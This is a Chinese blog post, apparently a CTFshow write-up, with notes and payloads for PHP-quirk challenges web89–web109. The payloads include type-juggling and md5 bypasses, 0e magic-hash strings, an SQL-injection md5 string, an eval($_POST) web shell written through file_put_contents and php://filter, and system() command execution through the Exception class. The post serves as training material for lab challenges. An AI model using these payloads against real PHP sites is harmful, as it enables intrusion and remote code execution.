@@ -1,0 +1,3201 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="ctfshow-php特性, Chenluo">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>ctfshow-php特性 | Chenluo</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+    <script src="https://v1.hitokoto.cn/?c=d&encode=js&select=%23hitokoto" defer></script>
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Chenluo" type="application/atom+xml">
+</head>
+
+
+
+   <style>
+    body{
+       background-image: url(https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/site/medias/background.jpg);
+       background-repeat:no-repeat;
+       background-size:cover;
+       background-attachment:fixed;
+    }
+</style>
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Chenluo</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Chenluo</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">ctfshow-php特性</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+	background-color: rgb(255, 255, 255,0.7);
+        border-radius: 10px;
+        box-shadow: 0 10px 35px 2px rgba(0, 0, 0, .15), 0 5px 15px rgba(0, 0, 0, .07), 0 2px 5px -5px rgba(0, 0, 0, .1) !important;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/CTFSHOW/">
+                                <span class="chip bg-color">CTFSHOW</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-07-17
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    4.8k
+                </div>
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><ul>
+<li><code>intval():</code>返回值</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">&gt;&#x3D;1 -----&gt;true\a[]\int(数字)\ array(&#39;tom&#39;,&#39;bob&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li>Payload:</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">?num[]&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsf2jigya4j30nj06emy9.jpg" alt="image-20210713093321157"></p>
+<h2 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h2><ul>
+<li>看php.net</li>
+</ul>
+<p><strong>interval()函数第二个参数为0时，转换的时候需要根据value的形式，如果以0开头，认为value是8进制，如果以0x开头，value是16进制</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsf2u3sk3pj30b20d7dgo.jpg" alt="image-20210713094330945"></p>
+<h2 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h2><ul>
+<li><code>preg_match(&#39;/^php$/im&#39;, $a)</code>匹配$a的<code>php</code>而且php应该是多行的情况比如<code>&quot;abc\nphp&quot;</code>,如果只是<code>php</code>也会匹配成功但如果是<code>abcphp</code>不会匹配成功。</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/regexp.reference.anchors.php">官网解释链接</a></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsf9ly4j2nj30on070dgv.jpg" alt="image-20210713133751883"></p>
+<p>payload:</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">aaa<span class="token operator">%</span><span class="token number">0</span>aphp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ol>
+<li>第一次多行匹配可以匹配到php</li>
+<li>第二次只匹配字符串首尾，无法匹配成功</li>
+</ol>
+<h2 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h2><ul>
+<li>同90</li>
+</ul>
+<h2 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h2><ul>
+<li>八进制绕过</li>
+</ul>
+<h2 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h2><ul>
+<li>小数绕过</li>
+</ul>
+<h2 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h2><ul>
+<li><code>strpos</code>查找字符串首次出现的位置，从0开始</li>
+<li>八进制绕过的时候需要在前面加一位</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsfb65020qj30r10botal.jpg" alt="image-20210713143152054"></p>
+<h2 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h2><ul>
+<li>php伪协议读取</li>
+</ul>
+<h2 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h2><ul>
+<li>用数组绕过</li>
+</ul>
+<p><strong>Md5()函数接受的是字符串，但是传入数组的时候不会报错，只不过是不会执行转换，导致，任意两个数组的值相等</strong></p>
+<ul>
+<li>要求值不相等</li>
+</ul>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">a<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;&amp;</span>b<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h2><ul>
+<li>三目运算符的理解</li>
+</ul>
+<p>GET和POST同时传参数</p>
+<pre class="line-numbers language-none"><code class="language-none">HTTP_FLAG&#x3D;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h2><ul>
+<li>根据题意，由于循环次数较多，循环数次数最多的最可能存在，也就是最开始的1-36存在的概率较大</li>
+<li>利用1-36中的任意数字，写文件，<code>in_array(string,array[])</code>弱检测，只关注数组中是否存在字符，不关心是否完全一样</li>
+</ul>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">?n=1.php
+content = <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h2 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h2><ol>
+<li>直接查看变量</li>
+</ol>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsfhubnzrbj30xf0ag40l.jpg" alt="image-20210713182241778"></p>
+<ol start="2">
+<li>写入代码，包含命令</li>
+</ol>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">v2<span class="token operator">=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token operator">></span> <span class="token comment">//不允许存在；，则用?>与后面的语句分割</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>根据提示<code>flag</code>在<code>ctfshow</code>中，查看<code>ctfshow</code>的代码</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">1</span><span class="token operator">=</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/var/www/html/ctfshow.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">v1<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>v2<span class="token operator">=</span><span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token class-name">Reflectionclass</span><span class="token operator">&amp;</span>v3<span class="token operator">=</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><code>Reflectionclass:</code>根据字符串动态创建类</p>
+<h2 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h2><p>特殊字符串:</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D; &#96;cat *&#96;;   base64编码后转换为二进制:
+
+PD89YGNhdCAqYDs
+
+5044383959474e6864434171594473
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>hex2bin:</code></p>
+<pre class="line-numbers language-none"><code class="language-none">将16进制转换为字符串<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li>由于之前将语句进行了base64编码，那么<code>file_put_contents</code>的时候，就需要<code>base64</code>解码</li>
+</ul>
+<p><strong>利用伪协议在写入语句的时候进行<code>base64</code>解码</strong></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token argument-name">php</span><span class="token punctuation">:</span><span class="token comment">//filter/write=convert.base64-decode/resource=1.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsfjm17cosj313108sta1.jpg" alt="image-20210713192357776"></p>
+<h2 id="Web103"><a href="#Web103" class="headerlink" title="Web103"></a>Web103</h2><ul>
+<li>同上</li>
+</ul>
+<h2 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h2><ul>
+<li>类似于绕过md5()</li>
+</ul>
+<p>数组绕过：</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsfkx8i8ndj31400lztgi.jpg" alt="image-20210713200920502"></p>
+<h2 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h2><p>两个$是覆盖复制</p>
+<p>解决办法:</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsfodi2p9fj309g023jrj.jpg" alt="image-20210713220846462"></p>
+<p>不可能知道flag是啥，就直接通过传参的方式令<code>error=flag</code>，这样结束的时候输出flag</p>
+<pre class="line-numbers language-none"><code class="language-none">r绕过get:
+suces&#x3D;flag
+绕过POST：
+error&#x3D;suces<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这种方式使得<code>$suces$error$flag</code>全部相同。。</p>
+<p>一旦<code>die</code>，就会输出<code>$flag</code></p>
+<h2 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h2><ul>
+<li>数组绕过，值不相等</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsfons0tvyj30mr08x0tw.jpg" alt="image-20210713221826337"></p>
+<h2 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h2><ul>
+<li>控制md5值为0，几个特殊的字符串md5值均以0e开头，也就是均为0</li>
+</ul>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">*</span> md5值以<span class="token number">0</span>e开头
+<span class="token constant">QNKCDZO</span>
+<span class="token number">240610708</span>
+s878926199a
+s155964671a
+s214587387a
+<span class="token operator">*</span> md5和双md5都是以<span class="token number">0</span>e开头
+CbDLytmyGm2xQyaLNhWn
+<span class="token number">770</span>hQgrBOjrcqftrlaZk
+<span class="token number">7</span>r4lGXCH2Ksu2JNT3BYM
+
+  特殊的md字符串
+ffifdyop   <span class="token function">md5</span><span class="token punctuation">(</span>ffifdyop<span class="token punctuation">)</span>转换为字符串后是 <span class="token string single-quoted-string">'or '</span><span class="token number">6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsfp1dfu4rj30ou0cvgn7.jpg" alt="image-20210713223142249"></p>
+<h2 id="Web108"><a href="#Web108" class="headerlink" title="Web108"></a>Web108</h2><ul>
+<li>ereg函数存在%00截断，可以绕过正则</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsfqnmy6mxj608a020glm02.jpg" alt="image-20210713232742573"></p>
+<ul>
+<li>strrev函数:将给定的字符串反转，</li>
+</ul>
+<p><strong>需要将给定的0x36d转换成十进制，再反转</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsfqwf6ew1j60e801wglp02.jpg" alt="image-20210713233609225"></p>
+<h2 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h2><h3 id="第一种方式"><a href="#第一种方式" class="headerlink" title="第一种方式"></a>第一种方式</h3><ul>
+<li>根据<code>new</code>知道，后面要加一个类,，并且这个类还要接受一条语句，默认本就有的类<code>Exception</code><strong>Exception</strong>是所有异常的基类</li>
+</ul>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">Exception <span class="token punctuation">&#123;</span>
+<span class="token comment">/* 属性 */</span>
+<span class="token keyword">protected</span> <span class="token keyword type-declaration">string</span> <span class="token variable">$message</span><span class="token punctuation">;</span>
+<span class="token keyword">protected</span> <span class="token keyword type-declaration">int</span> <span class="token variable">$code</span><span class="token punctuation">;</span>
+<span class="token keyword">protected</span> <span class="token keyword type-declaration">string</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
+<span class="token keyword">protected</span> <span class="token keyword type-declaration">int</span> <span class="token variable">$line</span><span class="token punctuation">;</span>
+<span class="token comment">/* 方法 */</span>
+<span class="token keyword">public</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token class-name type-declaration">Throwable</span> <span class="token variable">$previous</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span>
+<span class="token keyword">final</span> <span class="token keyword">public</span> <span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>
+<span class="token keyword">final</span> <span class="token keyword">public</span> <span class="token function">getPrevious</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token class-name return-type">Throwable</span>
+<span class="token keyword">final</span> <span class="token keyword">public</span> <span class="token function">getCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">mixed</span>
+<span class="token keyword">final</span> <span class="token keyword">public</span> <span class="token function">getFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>
+<span class="token keyword">final</span> <span class="token keyword">public</span> <span class="token function">getLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">int</span>
+<span class="token keyword">final</span> <span class="token keyword">public</span> <span class="token function">getTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">array</span>
+<span class="token keyword">final</span> <span class="token keyword">public</span> <span class="token function">getTraceAsString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>
+<span class="token keyword">public</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>
+<span class="token keyword">final</span> <span class="token keyword">private</span> <span class="token function">__clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">void</span>
+<span class="token punctuation">&#125;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>可知，这个类的构造函数要求一条信息(语句)会自动执行<code>__construct,__toString__clone</code></li>
+</ul>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token keyword">try</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$err</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'抛出异常信息，并跳出 try 语句块'</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./test'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'这里是一些可能会发生异常的代码'</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token variable">$err</span><span class="token punctuation">,</span> <span class="token number">12345</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 抛出异常</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'上面抛出异常的话，这行代码将不会执行，转而执行 catch 中的代码。&lt;br>'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'捕获异常：'</span><span class="token operator">.</span><span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>错误代码：'</span><span class="token operator">.</span><span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'继续执行 try catch 语句之外的代码'</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">捕获异常：抛出异常信息，并跳出 <span class="token keyword">try</span> 语句块
+错误代码：<span class="token number">12345</span>
+继续执行 <span class="token keyword">try</span> <span class="token keyword">catch</span> 语句之外的代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>Exception会输出第一个参数,也可以执行，之后转换为字符串输出</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">v1<span class="token operator">=</span>Exception<span class="token operator">&amp;</span>v2<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac fl36dg.txt'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsg6afsht9j613q06cgn502.jpg" alt="image-20210714082836558"></p>
+<p>**注意:**可以先根据<code>ls</code>命令查看<code>flag</code>文件</p>
+<h3 id="第二种方式"><a href="#第二种方式" class="headerlink" title="第二种方式"></a>第二种方式</h3><p><code>Reflectionclass</code>函数根据字符串动态返回一个类</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsg6ijhx77j30nx03wq30.jpg" alt="image-20210714083620224"></p>
+<ul>
+<li>抛出错误的时候会执行Exception基类的<code>__tostring</code>方法,将错误转换成字符串</li>
+</ul>
